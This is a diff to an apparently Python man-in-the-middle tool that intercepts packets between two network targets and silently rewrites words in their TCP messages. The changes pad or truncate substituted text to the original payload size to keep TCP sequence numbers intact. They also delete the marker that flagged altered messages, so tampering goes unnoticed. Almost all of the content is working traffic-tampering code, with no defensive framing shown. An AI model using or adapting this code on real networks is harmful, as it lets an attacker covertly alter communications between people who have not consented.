@@ -200,14 +200,14 @@ def modify_bidirectional_packet(packet):
                     logger.info(f"[SOCKET-MODIFY] 🔧 {direction} | Original: '{message.strip()}'")
                     logger.info(f"[SOCKET-MODIFY] 🔧 {direction} | Modified: '{modified_message.strip()}'")
                     
-                    # CRITICAL: Maintain packet size to preserve TCP sequence numbers
+                    # Handle payload size changes - maintain original size for TCP stability
                     modified_payload = pad_to_original_size(modified_message.encode('utf-8'), len(payload))
-                    logger.info(f"[SOCKET-DEBUG] Modified packet size: {len(modified_payload)} bytes (padded to match original)")
+                    logger.info(f"[SOCKET-DEBUG] Modified packet size: {len(modified_payload)} bytes (preserved original: {len(payload)} bytes)")
                     
                     # Update packet with modified payload
                     scapy_pkt[Raw].load = modified_payload
                     
-                    # Recalculate checksums
+                    # Recalculate checksums (length stays the same)
                     del scapy_pkt[IP].len
                     del scapy_pkt[IP].chksum
                     del scapy_pkt[TCP].chksum
@@ -224,7 +224,7 @@ def modify_bidirectional_packet(packet):
     packet.accept()
 
 def pad_to_original_size(modified_payload, original_size):
-    """Pad the modified payload to match the original packet size"""
+    """Preserve original packet size to maintain TCP sequence numbers"""
     if len(modified_payload) == original_size:
         return modified_payload
     elif len(modified_payload) < original_size:
@@ -232,32 +232,40 @@ def pad_to_original_size(modified_payload, original_size):
         padding_needed = original_size - len(modified_payload)
         return modified_payload + b' ' * padding_needed
     else:
-        # If somehow larger, truncate (shouldn't happen with our modifications)
-        logger.warning(f"[SOCKET-DEBUG] Modified payload larger than original, truncating")
+        # Must truncate to preserve TCP sequence numbers
+        logger.warning(f"[SOCKET-DEBUG] Modified payload larger than original, truncating to preserve TCP flow")
         return modified_payload[:original_size]
 
 def modify_socket_message(original_message, direction):
-    """Modify socket messages using configured replacements"""
+    """Modify socket messages using configured replacements with size preservation"""
     message = original_message
+    original_length = len(original_message)
+    was_modified = False
     
-    # Apply configured modifications
+    # Apply modifications from config with size checking
     for original_word, replacement in SOCKET_MODIFICATIONS.items():
-        # Case-insensitive replacement
-        message = re.sub(re.escape(original_word), replacement, message, flags=re.IGNORECASE)
+        if original_word.lower() in message.lower():
+            # Try the replacement from config
+            test_message = re.sub(re.escape(original_word), replacement, message, flags=re.IGNORECASE)
+            
+            # If it fits, use it. If not, truncate the replacement to fit
+            if len(test_message) <= original_length:
+                message = test_message
+                was_modified = True
+            else:
+                # Calculate how much space we have for the replacement
+                space_available = original_length - (len(message) - len(original_word))
+                if space_available > 0:
+                    # Truncate replacement to fit available space
+                    truncated_replacement = replacement[:space_available]
+                    message = re.sub(re.escape(original_word), truncated_replacement, message, flags=re.IGNORECASE)
+                    was_modified = True
+                    logger.info(f"[SOCKET-DEBUG] Truncated '{replacement}' to '{truncated_replacement}' to fit packet size")
     
-    # Add direction-specific modifications if needed
-    if direction.startswith(target_1.name):
-        # Messages from target_1 can have specific modifications
-        pass
-    elif direction.startswith(target_2.name):
-        # Messages from target_2 can have specific modifications  
-        pass
-    
-    # Add interception marker if message was modified
-    if message != original_message:
-        # Use shorter marker to avoid making message too long
-        direction_short = f"{direction.split()[0][:1]}→{direction.split()[-1][:1]}"
-        message = f"[M:{direction_short}] {message}"
+    # Pad to exact original size if modified
+    if was_modified and len(message) < original_length:
+        padding_needed = original_length - len(message)
+        message = message + " " * padding_needed
     
     return message
 
@@ -287,7 +295,7 @@ def start_bidirectional_interception():
     logger.info(f"[MITM] 🌐 Gateway: {gateway_device}")
     logger.info(f"[MITM] 🔧 Bidirectional: {'Enabled' if ENABLE_BIDIRECTIONAL_INTERCEPTION else 'Disabled'}")
     logger.info(f"[MITM] 🔀 Modifications: {SOCKET_MODIFICATIONS}")
-    logger.info("[MITM] 💡 TCP sequence numbers preserved by padding packets to original size")
+    logger.info("[MITM] 💡 Compact modifications preserve TCP packet sizes")
     logger.info("[MITM] 🛑 Press Ctrl+C to stop and cleanup")
     
     try:
@@ -317,10 +325,10 @@ def display_configuration():
     print(f"  • {target_1.name} → Gateway → {target_2.name} (Routed)")
     print(f"  • {target_2.name} → Gateway → {target_1.name} (Routed)")
     print("=" * 70)
-    print("🔧 TCP Sequence Number Preservation:")
-    print("  • Packets padded to maintain original size")
-    print("  • Prevents TCP desynchronization")
-    print("  • Ensures reliable bidirectional interception")
+    print("🔧 TCP Packet Handling:")
+    print("  • Uses configured replacements with size preservation")
+    print(f"  • Current modifications: {SOCKET_MODIFICATIONS}")
+    print("  • Replacements truncated if needed to fit packet size")
     print("=" * 70)
     
     if SecurityConfig.REQUIRE_CONFIRMATION:
